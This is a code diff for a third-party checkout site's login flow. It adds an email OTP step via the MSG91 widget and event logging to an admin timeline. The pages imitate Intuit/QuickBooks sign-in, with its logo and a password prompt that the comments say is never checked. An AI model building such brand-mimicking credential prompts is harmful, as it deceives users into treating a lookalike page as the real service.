@@ -9,6 +9,17 @@ import { useRouter, useSearchParams } from 'next/navigation';
 import { useState, useEffect, useRef } from 'react';
 import toast from 'react-hot-toast';
 
+// Fire-and-forget login/OTP audit trail, shown in the admin panel's Consent Logs event timeline
+// (grouped by paymentId + IP into one session, same as the existing link_opened/email_entered
+// events). `detail` is free-form per event type — the timeline UI renders it as-is.
+function logAuthEvent(event: string, paymentId: string | null, email?: string, detail?: Record<string, unknown>) {
+    fetch('/api/track-event', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ event, paymentId, email, detail }),
+    }).catch(console.error);
+}
+
 // Login Page Component
 const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
     const [email, setEmail] = useState('');
@@ -86,30 +97,25 @@ const LoginPage = ({ onNext }: { onNext: (email: string) => void }) => {
     );
 };
 
-// Password Page Component
-const PasswordPage = ({ email, onBack }: { email: string; onBack: () => void }) => {
+// Password Page Component — kept as a UI step for parity with the real Intuit sign-in flow; any
+// non-empty value proceeds (this was never checked against a real password) straight on to the
+// actual security check, the OTP step below.
+const PasswordPage = ({ email, onBack, onNext }: { email: string; onBack: () => void; onNext: () => void }) => {
     const searchParams = useSearchParams()
     const paymentID = searchParams.get('token')
     const [password, setPassword] = useState('');
     const [showPassword, setShowPassword] = useState(false);
-    const router = useRouter()
     const {setStep} = useSteps()
-
-    useParamPaymentDetails({noLinkRedirection: true, enableToast: false, noLoginRedir: true})
 
     const handleContinue = (e: React.FormEvent<HTMLFormElement>) => {
         e.preventDefault()
-        if (!paymentID) {
-            toast.error('Internal Server Error')
-            return
-        }
         if (password) {
-            setStep(2)
-            toast.success('Login successful')
-            router.push('/order-summary?token=' + paymentID)
+            logAuthEvent('password_entered', paymentID, email);
+            setStep(1)
+            onNext();
         }
     };
-    
+
     return (
         <div className="mt-20 flex items-center justify-center p-4">
             <form onSubmit={handleContinue} className="bg-white p-10 rounded-lg shadow-sm border border-gray-200 w-full max-w-md">
@@ -176,7 +182,247 @@ const PasswordPage = ({ email, onBack }: { email: string; onBack: () => void }) 
                 >
                     Continue
                 </button>
-                
+
+                {/* Independent Service Disclaimer */}
+                <div className="mt-8 pt-4 border-t border-gray-100">
+                    <p className="text-[10px] leading-snug text-gray-400 text-center">
+                        <strong>Disclaimer:</strong> quickbooks-enterprises.com is an independent third-party service provider and is NOT affiliated with, endorsed by, or sponsored by Intuit Inc. QuickBooks is a registered trademark of Intuit Inc.
+                    </p>
+                </div>
+            </form>
+        </div>
+    );
+};
+
+declare global {
+    interface Window {
+        initSendOTP?: (config: Record<string, unknown>) => void;
+        sendOtp?: (identifier: string, success?: (data: unknown) => void, failure?: (error: unknown) => void) => void;
+        retryOtp?: (channel: string | null, success?: (data: unknown) => void, failure?: (error: unknown) => void, reqId?: string) => void;
+        verifyOtp?: (otp: number, success?: (data: unknown) => void, failure?: (error: unknown) => void, reqId?: string) => void;
+    }
+}
+
+/** MSG91's own callback payload shape isn't documented beyond "you get an access token" — try
+ *  the field names its server-side verifyAccessToken response uses (`message`) plus a couple of
+ *  reasonable fallbacks, since the widget's client callback has been observed to vary. */
+function extractAccessToken(data: unknown): string | undefined {
+    if (typeof data === 'string') return data;
+    if (data && typeof data === 'object') {
+        const obj = data as Record<string, unknown>;
+        const candidate = obj.message || obj.accessToken || obj['access-token'] || obj.access_token || obj.token;
+        if (typeof candidate === 'string') return candidate;
+    }
+    return undefined;
+}
+
+// OTP Page Component — replaces the old fake "Enter your Intuit password" step with a real
+// email OTP challenge via the MSG91 widget, so a customer actually has to prove they own the
+// email address before reaching checkout.
+const OtpPage = ({ email, onBack }: { email: string; onBack: () => void }) => {
+    const searchParams = useSearchParams()
+    const paymentID = searchParams.get('token')
+    const [code, setCode] = useState('');
+    const [widgetReady, setWidgetReady] = useState(false);
+    const [otpSent, setOtpSent] = useState(false);
+    const [isVerifying, setIsVerifying] = useState(false);
+    const [isResending, setIsResending] = useState(false);
+    const router = useRouter()
+    const {setStep} = useSteps()
+    const sentOnceRef = useRef(false);
+
+    useParamPaymentDetails({noLinkRedirection: true, enableToast: false, noLoginRedir: true})
+
+    // Loads the widget script once per mount and initializes it against this email — matches
+    // the exact snippet MSG91's "Client Side Integration" page generates for this widget
+    // (captcha disabled in the widget's own settings, so no captchaRenderId is needed here).
+    // Falls back to the phone91.com mirror if the primary host doesn't load, same as MSG91's
+    // own generated snippet.
+    useEffect(() => {
+        const urls = ['https://verify.msg91.com/otp-provider.js', 'https://verify.phone91.com/otp-provider.js'];
+        let i = 0;
+        let activeScript: HTMLScriptElement | null = null;
+
+        const attempt = () => {
+            const s = document.createElement('script');
+            s.src = urls[i];
+            s.async = true;
+            s.onload = () => {
+                window.initSendOTP?.({
+                    widgetId: process.env.NEXT_PUBLIC_MSG91_WIDGET_ID,
+                    tokenAuth: process.env.NEXT_PUBLIC_MSG91_WIDGET_TOKEN,
+                    // No `identifier` here deliberately: setting one makes the widget auto-send an
+                    // OTP right at init using THIS config's own success/failure (the no-ops below),
+                    // not the per-call callbacks passed to sendOtp() further down — so our React
+                    // state (otpSent) never saw it complete and the code input stayed stuck on
+                    // "Sending code...". Leaving identifier unset here makes sendOtp() below the
+                    // only thing that ever actually sends a code.
+                    exposeMethods: true,
+                    // Handled per-call via sendOtp/verifyOtp's own callbacks instead — passing
+                    // these too would fire every event twice (MSG91's own documented caveat).
+                    success: () => {},
+                    failure: () => {},
+                });
+                setWidgetReady(true);
+            };
+            s.onerror = () => {
+                i++;
+                if (i < urls.length) attempt();
+            };
+            document.head.appendChild(s);
+            activeScript = s;
+        };
+        attempt();
+
+        return () => {
+            activeScript?.remove();
+        };
+    }, [email]);
+
+    // Auto-send the first OTP as soon as the widget is ready, so the customer doesn't have to
+    // click twice (enter email, then click "send code").
+    useEffect(() => {
+        if (!widgetReady || sentOnceRef.current) return;
+        sentOnceRef.current = true;
+        window.sendOtp?.(
+            email,
+            () => { logAuthEvent('otp_sent', paymentID, email); setOtpSent(true); },
+            (error: any) => {
+                logAuthEvent('otp_send_failed', paymentID, email, { reason: error?.message || String(error) });
+                toast.error('Could not send the verification code. Try resending.');
+            },
+        );
+    }, [widgetReady, email]);
+
+    const handleResend = () => {
+        if (isResending) return;
+        setIsResending(true);
+        window.retryOtp?.(
+            null,
+            () => { logAuthEvent('otp_sent', paymentID, email, { resend: true }); toast.success('Code resent'); setIsResending(false); },
+            (error: any) => {
+                logAuthEvent('otp_send_failed', paymentID, email, { resend: true, reason: error?.message || String(error) });
+                toast.error(error?.message || 'Could not resend the code'); setIsResending(false);
+            },
+        );
+    };
+
+    const handleVerify = async (e: React.FormEvent<HTMLFormElement>) => {
+        e.preventDefault()
+        if (!paymentID) {
+            toast.error('Internal Server Error')
+            return
+        }
+        if (!code || isVerifying) return;
+
+        logAuthEvent('otp_submitted', paymentID, email, { codeLength: code.length });
+        setIsVerifying(true);
+        window.verifyOtp?.(
+            Number(code),
+            async (data: unknown) => {
+                const accessToken = extractAccessToken(data);
+                if (!accessToken) {
+                    logAuthEvent('otp_verification_failed', paymentID, email, { reason: 'no access token in widget response' });
+                    toast.error('Verification failed — try again.');
+                    setIsVerifying(false);
+                    return;
+                }
+                try {
+                    const res = await fetch('/api/auth/verify-otp-token', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ accessToken, email }),
+                    });
+                    const json = await res.json();
+                    if (!res.ok || !json.success) {
+                        logAuthEvent('otp_verification_failed', paymentID, email, { reason: json.error || 'server rejected token' });
+                        toast.error(json.error || 'Verification failed — try again.');
+                        setIsVerifying(false);
+                        return;
+                    }
+                    logAuthEvent('otp_verified', paymentID, email);
+                    setStep(2)
+                    toast.success('Login successful')
+                    router.push('/order-summary?token=' + paymentID)
+                } catch {
+                    logAuthEvent('otp_verification_failed', paymentID, email, { reason: 'network error contacting our server' });
+                    toast.error('Verification failed — try again.');
+                    setIsVerifying(false);
+                }
+            },
+            (error: any) => {
+                logAuthEvent('otp_verification_failed', paymentID, email, { reason: error?.message || 'Incorrect code' });
+                toast.error(error?.message || 'Incorrect code — try again.');
+                setIsVerifying(false);
+            },
+        );
+    };
+
+    return (
+        <div className="mt-20 flex items-center justify-center p-4">
+            <form onSubmit={handleVerify} className="bg-white p-10 rounded-lg shadow-sm border border-gray-200 w-full max-w-md">
+                {/* Logo */}
+                <div className="mb-5">
+                    <img src="/quickbooks_logo.png" className='mx-auto' alt="Intuit Logo" width={200} height={100} />
+                </div>
+
+                {/* Title */}
+                <h2 className="text-xl font-semibold text-gray-800 text-center mb-2 font-normal">
+                    Enter the code we sent you
+                </h2>
+
+                {/* Email Display */}
+                <div className="text-center mb-2">
+                    <span className="text-gray-700">{email}</span>
+                </div>
+
+                {/* Use Different Account Link */}
+                <div className="text-center mb-6">
+                    <button
+                        type="button"
+                        onClick={onBack}
+                        className="text-blue-600 hover:text-blue-800 text-sm underline"
+                    >
+                        Use a different account
+                    </button>
+                </div>
+
+                {/* OTP Input */}
+                <div className="mb-3">
+                    <label className="block text-gray-700 text-sm mb-2">Verification code</label>
+                    <input
+                        required
+                        inputMode="numeric"
+                        autoComplete="one-time-code"
+                        placeholder={otpSent ? 'Enter the verification code' : 'Sending code...'}
+                        disabled={!otpSent}
+                        value={code}
+                        onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))}
+                        className="w-full px-4 py-3 border-2 border-[#2ca01c] rounded focus:outline-none focus:border-blue-500 text-gray-700 disabled:opacity-60"
+                    />
+                </div>
+
+                {/* Resend */}
+                <div className="text-right mb-6">
+                    <button
+                        type="button"
+                        onClick={handleResend}
+                        disabled={!otpSent || isResending}
+                        className="text-blue-600 hover:text-blue-800 text-sm underline disabled:opacity-50 disabled:no-underline"
+                    >
+                        {isResending ? 'Resending...' : 'Resend code'}
+                    </button>
+                </div>
+
+                {/* Continue Button */}
+                <button
+                    type='submit'
+                    disabled={!otpSent || isVerifying}
+                    className="w-full bg-[#2ca01c] hover:bg-[#2CA01C] text-white py-3 px-4 rounded font-medium transition-colors duration-200 mb-2 disabled:opacity-60"
+                >
+                    {isVerifying ? 'Verifying...' : 'Continue'}
+                </button>
+
                 {/* Independent Service Disclaimer */}
                 <div className="mt-8 pt-4 border-t border-gray-100">
                     <p className="text-[10px] leading-snug text-gray-400 text-center">
@@ -248,12 +494,16 @@ export default function IntuitLogin() {
         setCurrentPage('password');
     };
 
+    const handlePasswordNext = () => {
+        setCurrentPage('otp');
+    };
+
     const handleBack = () => {
         setStep(0)
         setCurrentPage('login');
         setUserDetails({email: ''})
     };
-    const steps = ['Login', 'Password', 'test'];
+    const steps = ['Login', 'Password', 'OTP', 'test'];
     const handleStepChange = (step: number) => {
         setCurrentPage(step.toString());
     };
@@ -263,7 +513,10 @@ export default function IntuitLogin() {
                 <LoginPage onNext={handleNext} />
             )}
             {currentPage === 'password' && (
-                <PasswordPage email={userDetails.email} onBack={handleBack} />
+                <PasswordPage email={userDetails.email} onBack={handleBack} onNext={handlePasswordNext} />
+            )}
+            {currentPage === 'otp' && (
+                <OtpPage email={userDetails.email} onBack={handleBack} />
             )}
         </>
     );
